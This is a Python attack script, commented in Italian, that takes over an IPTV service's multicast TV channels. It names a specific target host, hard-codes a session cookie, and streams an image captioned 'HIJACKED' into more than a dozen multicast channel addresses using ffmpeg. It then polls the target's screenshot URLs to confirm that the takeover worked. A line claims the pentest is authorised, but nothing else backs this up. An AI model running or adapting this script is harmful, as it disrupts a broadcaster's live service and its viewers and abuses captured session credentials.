#!/usr/bin/env python3
# SATURN TV HIJACKER - FULL MULTICAST TAKEOVER

import subprocess
import threading
import time
import socket
import requests
import sys
import os

TARGET = "185.22.183.148:8085"
COOKIE = "PHPSESSID=rk9a4s6ub06m8l1fei8jrmop02"
UDP_PORT = 1234
PNG_FILE = "pat.png"

def get_public_ip():
    ip = subprocess.check_output(["curl", "-s", "ifconfig.me"]).decode().strip()
    print(f"🔥 IP PUBBLICO: {ip}:{UDP_PORT}")
    return ip

def udp_server(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', port))
    print(f"🎧 UDP SERVER {port} READY - Aspetto TV server...")
    while True:
        data, addr = sock.recvfrom(65535)
        print(f"📡 TV SERVER HIT: {addr} -> {len(data)} bytes")
        sock.sendto(b"OK", addr)

def multicast_hijacker():
    """Sovrascrivi TUTTI gli stream UDP del target"""
    multicast_groups = [
        # UDP multicast da channels list
        "233.166.172.91:1234",    # ch1 pervy
        "233.166.172.85:1234",    # ch2 ntv
        "233.166.173.34:1234",    # ch6
        "233.166.172.183:1234",   # ch7
        "233.166.172.212:1234",   # ch8
        "233.166.172.210:1234",   # ch12
        "233.166.173.39:1234",    # ch15
        
        # Altri dal dashboard grep precedente
        "233.166.172.103:1234",   # ch4?
        "233.166.176.111:1234",   # chX
        "233.166.172.91:1234",    # ch3 pervy_50 (dupe)
        
        # Copertura totale multicast range
        "233.166.172.91:1234",
        "233.166.172.85:1234", 
        "233.166.173.34:1234",
        "233.166.172.183:1234",
        "233.166.172.212:1234",
        "233.166.172.210:1234",
        "233.166.173.39:1234",
        "233.166.172.103:1234",
        "233.166.176.111:1234",
    ]
    
    for i, mcast in enumerate(multicast_groups):
        cmd = [
            'ffmpeg', '-stream_loop', '-1', '-loop', '1', '-i', PNG_FILE,
            '-vf', f"scale=1280:720,drawtext=text='HIJACKED CH{i+1}':fontsize=60:fontcolor=red:x=(w-text_w)/2:y=(h-text_h)/2,drawtext=text='{mcast}':fontsize=24:fontcolor=yellow:x=10:y=30",
            '-c:v', 'libx264', '-pix_fmt', 'yuv420p', '-preset', 'ultrafast', '-tune', 'zerolatency', '-maxrate', '5M', '-bufsize', '10M',
            '-f', 'mpegts', f'udp://{mcast}?pkt_size=1316&ttl=32'
        ]
        print(f"💥 [{i+1:2d}] HIJACK -> udp://{mcast}")
        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(0.5)

def png_udp_server(ip, port):
    cmd = [
        'ffmpeg', '-stream_loop', '-1', '-loop', '1', '-i', PNG_FILE,
        '-vf', f"scale=1280:720,drawtext=text='YOUR_IP_{ip}':fontsize=48:fontcolor=white:x=(w-text_w)/2:y=h-80",
        '-c:v', 'libx264', '-pix_fmt', 'yuv420p', '-preset', 'ultrafast', '-tune', 'zerolatency',
        '-f', 'mpegts', f'udp://0.0.0.0:{port}'
    ]
    print("🎥 PNG UDP PUBLIC SERVER START")
    subprocess.Popen(cmd)

def analyze_hls_status():
    """Monitor screenshot remoti del target"""
    channels = ["pervy", "ntv", "pervy_50", "pervy_playlist_m3u8"]
    print("\n🔍 ANALISI SCHERMO TARGET:")
    for ch in channels:
        try:
            ss_in = f"http://{TARGET}/media/ss/183_148_IN_screen_{ch}.jpg"
            ss_out = f"http://{TARGET}/media/ss/183_148_OUT_screen_{ch}.jpg"
            
            r1 = requests.head(ss_in, timeout=3, headers={'User-Agent':'Mozilla/5.0'})
            r2 = requests.head(ss_out, timeout=3, headers={'User-Agent':'Mozilla/5.0'})
            
            if r1.status_code == 200 and r2.status_code == 200:
                print(f"✅ [{ch}] HIJACKED - IN:{r1.status_code} OUT:{r2.status_code}")
            else:
                print(f"❌ [{ch}] ORIGINAL - IN:{r1.status_code} OUT:{r2.status_code}")
        except Exception as e:
            print(f"⚠️  [{ch}] ERROR: {e}")
    print("-" * 60)

def main():
    if not os.path.exists(PNG_FILE):
        print("❌ pat.png mancante!")
        sys.exit(1)
    
    ip = get_public_ip()
    
    print("\n🚀 PENTEST HIJACK ATTIVO - Autorizzato")
    
    # THREADS PARALLELI
    threading.Thread(target=udp_server, args=(UDP_PORT,), daemon=True).start()
    threading.Thread(target=png_udp_server, args=(ip, UDP_PORT), daemon=True).start()
    
    time.sleep(2)
    
    # ATTACCO MULTICAST TOTALE
    multicast_thread = threading.Thread(target=multicast_hijacker, daemon=True)
    multicast_thread.start()
    
    # MONITOR 24/7
    try:
        while True:
            analyze_hls_status()
            print(f"📡 UDP HITS in corso... | Multicast: {multicast_thread.is_alive()}")
            time.sleep(20)
    except KeyboardInterrupt:
        print("\n🛑 Hijack fermato")

if __name__ == "__main__":
    main()
